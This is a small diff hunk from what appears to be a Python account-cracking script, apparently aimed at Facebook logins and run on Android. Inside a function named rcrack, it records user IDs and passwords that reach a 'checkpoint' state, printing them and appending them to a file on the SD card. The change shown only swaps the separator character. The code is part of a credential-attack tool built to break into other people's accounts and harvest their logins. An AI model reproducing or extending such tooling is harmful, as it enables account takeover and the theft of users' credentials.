@@ -423,8 +423,8 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('\r\r\33[1;30m[CP-ID] ' +uid+ ' • ' +ps+           '  \33[0;97m')
-                sn4gdh9('/sdcard/DEVHIS-CP.txt', 'a').write( uid+' • '+ps+' \n')
+                print('\r\r\33[1;30m[CP-ID] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                sn4gdh9('/sdcard/DEVHIS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
